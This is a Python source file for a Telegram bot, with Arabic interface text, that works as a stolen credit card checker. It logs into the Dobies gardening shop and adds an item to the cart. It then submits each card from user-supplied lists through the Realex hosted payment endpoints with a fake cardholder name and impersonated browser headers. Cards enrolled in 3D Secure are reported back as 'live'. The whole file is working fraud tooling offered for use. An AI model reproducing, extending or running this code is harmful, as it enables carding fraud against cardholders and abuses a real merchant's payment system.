# -*- coding: utf-8 -*-
"""
DOBIES CC Checker — Telegram Bot
"""
import asyncio
import logging
import os
import re
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

from curl_cffi import requests as curl_requests
import requests
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

load_dotenv()

# ========== CONFIGURATION ==========
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
LOGIN_EMAIL = os.getenv("LOGIN_EMAIL", "")
LOGIN_PASSWORD = os.getenv("LOGIN_PASSWORD", "")
MAX_CARDS_PER_CHECK = 100
CARD_DELAY_SEC = 1.0

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s",
    level=logging.INFO,
)
log = logging.getLogger(__name__)

# ========== CONSTANTS ==========
CARD_PATTERN = re.compile(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")
DOBIES_BASE = "https://www.dobies.co.uk"
REALEX_BASE = "https://pay.realexpayments.com/hosted-payments/blue"

CHECKOUT_HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "accept-language": "ar,en-US;q=0.9,en;q=0.8",
    "cache-control": "max-age=0",
    "referer": "https://pay.realexpayments.com/",
    "upgrade-insecure-requests": "1",
    "user-agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
    ),
}

BASE_HEADERS = {
    "Accept": "*/*",
    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://pay.realexpayments.com",
    "User-Agent": CHECKOUT_HEADERS["user-agent"],
    "X-Requested-With": "XMLHttpRequest",
}

# ========== SESSION ==========
dobies_session = None
user_sessions: dict = {}


def mask_card(card: str) -> str:
    parts = card.split("|")
    if len(parts) != 4:
        return card[:6] + "****" if len(card) > 6 else card
    cc, mm, yy, cvv = parts
    masked_cc = cc[:6] + "*" * max(0, len(cc) - 10) + cc[-4:] if len(cc) >= 10 else cc
    return f"{masked_cc}|{mm}|{yy}|***"


def format_elapsed(seconds: int) -> str:
    h, rem = divmod(seconds, 3600)
    m, s = divmod(rem, 60)
    return f"{h:02d}:{m:02d}:{s:02d}"


def parse_cards(text: str) -> tuple[list[str], list[str]]:
    """يرجع (كروت صالحة، أسطر مرفوضة)"""
    valid, invalid = [], []
    seen = set()
    for line in text.strip().splitlines():
        card = line.strip()
        if not card or card.startswith("#"):
            continue
        if not CARD_PATTERN.match(card):
            invalid.append(card)
            continue
        if card in seen:
            continue
        seen.add(card)
        valid.append(card)
    return valid, invalid


def get_user_stats(user_id: int) -> dict:
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            "total": 0,
            "checking": 0,
            "success_3ds": 0,
            "failed": 0,
            "errors": 0,
            "start_time": None,
            "is_running": False,
            "dashboard_message_id": None,
            "chat_id": None,
            "current_card": "",
            "last_response": "في الانتظار...",
            "cards_checked": 0,
            "success_cards": [],
        }
    return user_sessions[user_id]


def reset_user_stats(user_id: int) -> None:
    if user_id in user_sessions:
        user_sessions[user_id].update({
            "total": 0,
            "checking": 0,
            "success_3ds": 0,
            "failed": 0,
            "errors": 0,
            "start_time": None,
            "is_running": False,
            "current_card": "",
            "last_response": "في الانتظار...",
            "cards_checked": 0,
            "success_cards": [],
        })


def base_card_data(cc: str, guid: str) -> dict:
    return {
        "pas_cctype": "MC",
        "pas_pareq": "", "pas_acsurl": "", "pas_termurl": "",
        "encryptMD": "", "verifyMessage": "", "verifyResult": "", "verifyEnrolled": "",
        "pas_ccnum": cc,
        "cardIdentifyError": "",
        "pas_expiry": "", "pas_cccvc": "", "pas_issuenumber": "", "pas_ccname": "",
        "guid": guid,
        "dccchoice": "", "dccrate": "",
        "hppInstallmentPlanId": "", "hppInstallmentTcVersion": "", "hppInstallmentTcLang": "",
    }


# ========== AUTO LOGIN ==========
def do_login() -> bool:
    global dobies_session
    log.info("جاري تسجيل الدخول للحصول على كوكيز جديدة...")

    session = curl_requests.Session(impersonate="chrome120")
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-GB,en;q=0.9",
        "origin": DOBIES_BASE,
        "referer": f"{DOBIES_BASE}/sign-in",
        "user-agent": CHECKOUT_HEADERS["user-agent"],
    }

    try:
        session.get(DOBIES_BASE + "/", headers=headers, timeout=20)
        time.sleep(0.8)
        session.get(f"{DOBIES_BASE}/sign-in", headers=headers, timeout=20)
        time.sleep(0.8)

        session.post(
            f"{DOBIES_BASE}/sign-in",
            headers=headers,
            data={"EmailAddress": LOGIN_EMAIL, "Password": LOGIN_PASSWORD},
            allow_redirects=True,
            timeout=20,
        )
        time.sleep(0.8)

        account = session.get(
            f"{DOBIES_BASE}/account-management",
            headers={**headers, "referer": f"{DOBIES_BASE}/sign-in"},
            timeout=20,
        )

        if "My Account" not in account.text:
            log.error("فشل تسجيل الدخول")
            return False

        log.info("جاري إضافة منتج للسلة...")
        session.post(
            f"{DOBIES_BASE}/cart-JSON.cfm",
            headers={
                **headers,
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "referer": f"{DOBIES_BASE}/SUSGW2/peony-pink-hawaiian-coral_mh-76854",
                "x-requested-with": "XMLHttpRequest",
            },
            data=(
                "Quantity=1&addtobasket=1&prodcode=MH322"
                "&name=Carrot+'Autumn+King+2'+-+Seeds&sku=433811"
            ),
            timeout=20,
        )

        dobies_session = session
        log.info("تسجيل الدخول ناجح")
        return True

    except Exception as exc:
        log.exception("خطأ في اللوجين: %s", exc)
        return False


def get_cookies_dict() -> dict:
    global dobies_session
    if dobies_session is None:
        do_login()
    return dict(dobies_session.cookies) if dobies_session else {}


async def get_guid_with_retry(loop, stats: dict, max_retries: int = 2) -> str | None:
    for attempt in range(max_retries):
        cookies = get_cookies_dict()
        resp = await loop.run_in_executor(
            None,
            lambda: curl_requests.get(
                f"{DOBIES_BASE}/checkout/delivery",
                cookies=cookies,
                headers=CHECKOUT_HEADERS,
                impersonate="chrome120",
                timeout=30,
            ),
        )

        match = re.search(r"card\.html\?guid=([\w-]+)", resp.text)
        if match:
            return match.group(1)

        log.warning("فشل جلب GUID — محاولة %d/%d", attempt + 1, max_retries)
        stats["last_response"] = f"GUID Error — تجديد ({attempt + 1})"
        await loop.run_in_executor(None, do_login)
        await asyncio.sleep(2)

    return None


# ========== CARD CHECKER ==========
async def check_card(card: str, bot_app, user_id: int) -> tuple[str, str]:
    stats = get_user_stats(user_id)
    if not stats["is_running"]:
        return card, "STOPPED"

    parts = card.strip().split("|")
    if len(parts) != 4:
        stats["errors"] += 1
        return card, "ERROR"

    cc, mm, yy, cvv = parts
    yy2 = yy[-2:]
    mmyy = f"{mm}/{yy2}"
    stats["current_card"] = mask_card(card)

    try:
        loop = asyncio.get_running_loop()

        guid = await get_guid_with_retry(loop, stats)
        if not guid:
            stats["errors"] += 1
            stats["last_response"] = "GUID Error — فشل نهائي"
            return card, "ERROR"

        referer = f"{REALEX_BASE}/card.html?guid={guid}"
        hdrs = {**BASE_HEADERS, "Referer": referer}

        await loop.run_in_executor(
            None,
            lambda: requests.post(
                f"{REALEX_BASE}/3ds2/verifyEnrolled",
                headers=hdrs, data=base_card_data(cc, guid), timeout=20,
            ),
        )
        await loop.run_in_executor(
            None,
            lambda: requests.post(
                f"{REALEX_BASE}/api/cardIdentification",
                headers=hdrs, data=base_card_data(cc, guid), timeout=20,
            ),
        )

        auth_data = {
            **base_card_data(cc, guid),
            "pas_expiry": mmyy,
            "pas_cccvc": cvv,
            "pas_ccname": "John Smith",
            "browserJavaEnabled": "false",
            "browserLanguage": "ar",
            "screenColorDepth": "24",
            "screenHeight": "786",
            "screenWidth": "1397",
            "timezoneUtcOffset": "-120",
            "paymentFormHeight": "660",
            "paymentFormWidth": "600",
        }

        resp_auth = await loop.run_in_executor(
            None,
            lambda: requests.post(
                f"{REALEX_BASE}/api/auth",
                headers=hdrs, data=auth_data, timeout=30,
            ),
        )
        data = resp_auth.json()

        encoded_creq = (data.get("data") or {}).get("verifyEnrolledResult") or {}
        if encoded_creq.get("encodedCreq"):
            stats["success_3ds"] += 1
            stats["success_cards"].append(card)
            stats["last_response"] = "3D LIVE ✅"
            await send_result(bot_app, card, "3D", user_id)
            return card, "3D"

        result_code = (data.get("data") or {}).get("response") or {}
        code = result_code.get("result", data.get("status", "?"))
        stats["failed"] += 1
        stats["last_response"] = f"DECLINE ({code})"
        return card, "DECLINE"

    except Exception as exc:
        stats["errors"] += 1
        stats["last_response"] = f"Error: {str(exc)[:35]}"
        return card, "ERROR"


async def send_result(bot_app, card: str, status_type: str, user_id: int) -> None:
    stats = get_user_stats(user_id)
    if status_type != "3D":
        return

    text = (
        "✅ *3D SECURE LIVE*\n\n"
        f"💳 `{card}`\n\n"
        "🟢 Live — 3D Enrolled\n"
        f"📊 {stats['cards_checked']}/{stats['total']}"
    )
    await bot_app.bot.send_message(
        chat_id=stats["chat_id"],
        text=text,
        parse_mode="Markdown",
    )


# ========== DASHBOARD ==========
def _btn(text: str, callback: str = "noop", style: str | None = None) -> InlineKeyboardButton:
    kwargs: dict = {"text": text, "callback_data": callback}
    if style:
        kwargs["api_kwargs"] = {"style": style}
    return InlineKeyboardButton(**kwargs)


def _dash_status(stats: dict) -> tuple[str, str]:
    if stats["last_response"] == "Completed ✅":
        return "✅ اكتمل الفحص", "success"
    if stats["last_response"] == "Stopped":
        return "🛑 تم الإيقاف", "danger"
    if stats["is_running"]:
        return "🟢 الفحص شغال", "success"
    return "💤 في الانتظار", "primary"


def build_dashboard_text(user_id: int) -> str:
    return "🌸 *DOBIES CHECKER*"


def create_dashboard_keyboard(user_id: int) -> InlineKeyboardMarkup:
    stats = get_user_stats(user_id)
    elapsed = 0
    if stats["start_time"]:
        elapsed = int((datetime.now() - stats["start_time"]).total_seconds())

    progress = (stats["cards_checked"] / stats["total"] * 100) if stats["total"] else 0
    speed = (stats["cards_checked"] / elapsed * 60) if elapsed > 0 else 0
    status_text, status_style = _dash_status(stats)

    rows = [
        [_btn(status_text, style=status_style)],
        [_btn(f"📦 الإجمالي: {stats['total']}", style="primary")],
        [_btn(f"📊 التقدم: {stats['cards_checked']}/{stats['total']} ({progress:.0f}%)", style="primary")],
        [
            _btn(f"⏱ {format_elapsed(elapsed)}", style="primary"),
            _btn(f"🚀 {speed:.1f}/د", style="primary"),
        ],
        [
            _btn(f"✅ 3DS: {stats['success_3ds']}", style="success"),
            _btn(f"❌ Decline: {stats['failed']}", style="danger"),
        ],
        [_btn(f"🚫 Errors: {stats['errors']}", style="danger")],
        [_btn(f"📡 {stats['last_response'][:50]}", style="primary")],
    ]

    if stats["current_card"]:
        rows.append([_btn(f"🔍 {stats['current_card']}", style="primary")])

    if stats["is_running"]:
        rows.append([_btn("🛑 إيقاف الفحص", "stop_check", "danger")])
    else:
        rows.append([_btn("📤 أرسل ملف .txt للبدء", style="success")])

    rows.append([
        _btn("🔄 تحديث", "refresh_dash", "primary"),
        _btn("🔑 تجديد الجلسة", "reload_session", "primary"),
    ])

    return InlineKeyboardMarkup(rows)


async def update_dashboard(bot_app, user_id: int) -> None:
    stats = get_user_stats(user_id)
    if not stats["dashboard_message_id"] or not stats["chat_id"]:
        return
    try:
        await bot_app.bot.edit_message_text(
            chat_id=stats["chat_id"],
            message_id=stats["dashboard_message_id"],
            text=build_dashboard_text(user_id),
            reply_markup=create_dashboard_keyboard(user_id),
            parse_mode="Markdown",
        )
    except Exception:
        pass


def main_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            _btn("📖 المساعدة", "help", "primary"),
            _btn("📊 الحالة", "refresh_dash", "primary"),
        ],
        [_btn("🔑 تجديد الجلسة", "reload_session", "success")],
    ])


def limit_cards(cards: list[str]) -> tuple[list[str], int]:
    if len(cards) <= MAX_CARDS_PER_CHECK:
        return cards, 0
    return cards[:MAX_CARDS_PER_CHECK], len(cards) - MAX_CARDS_PER_CHECK


# ========== PROCESS CARDS ==========
async def process_cards(cards: list[str], bot_app, user_id: int) -> None:
    stats = get_user_stats(user_id)

    for card in cards:
        if not stats["is_running"]:
            break

        stats["current_card"] = mask_card(card)
        stats["checking"] = 1
        await update_dashboard(bot_app, user_id)
        await check_card(card, bot_app, user_id)
        stats["cards_checked"] += 1
        stats["checking"] = 0
        stats["current_card"] = ""
        await update_dashboard(bot_app, user_id)

        if stats["is_running"] and stats["cards_checked"] < stats["total"]:
            await asyncio.sleep(CARD_DELAY_SEC)

    was_stopped = stats["last_response"] == "Stopped"
    stats["is_running"] = False
    stats["checking"] = 0
    stats["current_card"] = ""
    stats["last_response"] = "Stopped" if was_stopped else "Completed ✅"
    await update_dashboard(bot_app, user_id)

    elapsed = int((datetime.now() - stats["start_time"]).total_seconds()) if stats["start_time"] else 0
    title = "🛑 تم الإيقاف" if was_stopped else "✅ اكتمل الفحص"
    summary = (
        f"*{title}*\n\n"
        f"📦 الإجمالي: `{stats['total']}`\n"
        f"✅ 3DS Live: `{stats['success_3ds']}`\n"
        f"❌ Declined: `{stats['failed']}`\n"
        f"🚫 Errors: `{stats['errors']}`\n"
        f"⏱ المدة: `{format_elapsed(elapsed)}`"
    )
    await bot_app.bot.send_message(
        chat_id=stats["chat_id"],
        text=summary,
        reply_markup=InlineKeyboardMarkup([
            [
                _btn(f"✅ 3DS: {stats['success_3ds']}", style="success"),
                _btn(f"❌ Decline: {stats['failed']}", style="danger"),
            ],
            [_btn(f"🚫 Errors: {stats['errors']}", style="danger")],
        ]),
        parse_mode="Markdown",
    )

    if stats["success_cards"]:
        success_text = "\n".join(stats["success_cards"])
        filename = Path(f"3ds_{user_id}_{int(datetime.now().timestamp())}.txt")
        filename.write_text(success_text, encoding="utf-8")
        try:
            with filename.open("rb") as doc:
                await bot_app.bot.send_document(
                    chat_id=stats["chat_id"],
                    document=doc,
                    caption=f"✅ *3DS Live Cards* — {len(stats['success_cards'])} كرت",
                    parse_mode="Markdown",
                )
        finally:
            filename.unlink(missing_ok=True)


async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list[str]) -> None:
    user_id = update.effective_user.id
    stats = get_user_stats(user_id)

    if stats["is_running"]:
        await update.effective_message.reply_text(
            "⚠️ *في فحص شغال دلوقتي!*\nاضغط 🛑 إيقاف من لوحة التحكم أولاً.",
            parse_mode="Markdown",
        )
        return

    cards, skipped = limit_cards(cards)
    if skipped:
        await update.effective_message.reply_text(
            f"⚠️ الحد الأقصى `{MAX_CARDS_PER_CHECK}` كرت — تم قص `{skipped}` كرت زيادة.",
            parse_mode="Markdown",
        )

    reset_user_stats(user_id)
    stats.update({
        "total": len(cards),
        "start_time": datetime.now(),
        "is_running": True,
        "chat_id": update.effective_chat.id,
    })

    dashboard_msg = await update.effective_message.reply_text(
        build_dashboard_text(user_id),
        reply_markup=create_dashboard_keyboard(user_id),
        parse_mode="Markdown",
    )
    stats["dashboard_message_id"] = dashboard_msg.message_id
    asyncio.create_task(process_cards(cards, context.application, user_id))


# ========== TELEGRAM HANDLERS ==========
HELP_TEXT = (
    "📖 *دليل الاستخدام*\n\n"
    "📄 أرسل ملف `.txt` أو الصق الكروت في رسالة\n"
    "📌 الصيغة: `number|MM|YYYY|CVV`\n\n"
    f"🔢 الحد الأقصى: *{MAX_CARDS_PER_CHECK}* كرت في المرة\n"
    "🐢 الفحص كرت كرت لتجنب الليمت\n\n"
    "✅ بيبعت رسالة فقط لو *3D LIVE*\n"
    "❌ الرفض مش بيبعت رسالة\n\n"
    "/start — القائمة\n"
    "/stop — إيقاف\n"
    "/reload — تجديد الجلسة"
)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "🚀 *DOBIES CC CHECKER*\n\n"
        "أرسل ملف `.txt` أو الصق الكروت مباشرة.\n"
        f"الحد الأقصى *{MAX_CARDS_PER_CHECK}* كرت — فحص كرت كرت.",
        reply_markup=main_menu_keyboard(),
        parse_mode="Markdown",
    )


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(HELP_TEXT, parse_mode="Markdown")


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    stats = get_user_stats(user_id)
    if stats["dashboard_message_id"]:
        await update_dashboard(context.application, user_id)
        await update.message.reply_text("📊 تم تحديث لوحة التحكم.")
    else:
        await update.message.reply_text(
            build_dashboard_text(user_id),
            reply_markup=create_dashboard_keyboard(user_id),
            parse_mode="Markdown",
        )


async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await stop_check(update.effective_user.id, context.application, update.effective_chat.id)


async def reload_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg = await update.message.reply_text("🔄 جاري تجديد الجلسة...")
    ok = await asyncio.get_running_loop().run_in_executor(None, do_login)
    text = "✅ تم تجديد الجلسة بنجاح." if ok else "❌ فشل تجديد الجلسة."
    await msg.edit_text(text)


async def stop_check(user_id: int, bot_app, chat_id: int) -> None:
    stats = get_user_stats(user_id)
    if not stats["is_running"]:
        await bot_app.bot.send_message(chat_id=chat_id, text="ℹ️ لا يوجد فحص شغال حالياً.")
        return
    stats["is_running"] = False
    stats["last_response"] = "Stopped"
    await update_dashboard(bot_app, user_id)
    await bot_app.bot.send_message(
        chat_id=chat_id,
        text="🛑 *تم إيقاف الفحص*",
        parse_mode="Markdown",
    )


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    file = await update.message.document.get_file()
    content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
    valid, invalid = parse_cards(content)

    if not valid:
        await update.message.reply_text(
            "❌ الملف فاضي أو لا يحتوي كروت بصيغة صحيحة.\n"
            "الصيغة: `number|MM|YYYY|CVV`",
            parse_mode="Markdown",
        )
        return

    note = ""
    if invalid:
        note = f"\n⚠️ تم تجاهل `{len(invalid)}` سطر بصيغة خاطئة."

    await update.message.reply_text(
        f"✅ تم تحميل `{len(valid)}` كرت.{note}",
        parse_mode="Markdown",
    )
    await start_check(update, context, valid)


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.message.text:
        return

    valid, invalid = parse_cards(update.message.text)
    if not valid:
        return

    note = f" (تجاهل {len(invalid)} سطر)" if invalid else ""
    await update.message.reply_text(
        f"✅ `{len(valid)}` كرت جاهز للفحص{note}",
        parse_mode="Markdown",
    )
    await start_check(update, context, valid)


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data

    if data == "noop":
        await query.answer()
        return

    if data == "help":
        await query.answer()
        await query.message.reply_text(HELP_TEXT, parse_mode="Markdown")
        return

    if data == "refresh_dash":
        await query.answer("تم التحديث")
        await update_dashboard(context.application, user_id)
        return

    if data == "reload_session":
        await query.answer("جاري التجديد...")
        ok = await asyncio.get_running_loop().run_in_executor(None, do_login)
        await query.message.reply_text(
            "✅ تم تجديد الجلسة." if ok else "❌ فشل تجديد الجلسة."
        )
        return

    if data == "stop_check":
        await query.answer("جاري الإيقاف...")
        stats = get_user_stats(user_id)
        await stop_check(user_id, context.application, stats["chat_id"] or query.message.chat_id)
        return

    await query.answer()


def validate_config() -> bool:
    missing = []
    if not BOT_TOKEN:
        missing.append("BOT_TOKEN")
    if not LOGIN_EMAIL:
        missing.append("LOGIN_EMAIL")
    if not LOGIN_PASSWORD:
        missing.append("LOGIN_PASSWORD")
    if missing:
        log.error("متغيرات البيئة ناقصة: %s", ", ".join(missing))
        return False
    return True


class _HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, _format, *_args):
        pass


def start_health_server() -> None:
    port = os.getenv("PORT")
    if not port:
        return
    server = HTTPServer(("0.0.0.0", int(port)), _HealthHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    log.info("Health check على المنفذ %s", port)


def main() -> None:
    if not validate_config():
        raise SystemExit(1)

    start_health_server()

    log.info("جاري تسجيل الدخول الأولي...")
    if not do_login():
        log.warning("فشل اللوجين الأولي — سيُعاد المحاولة أثناء الفحص")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("reload", reload_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(button_callback))

    log.info("البوت شغال — فحص تسلسلي، حد %d كرت", MAX_CARDS_PER_CHECK)
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
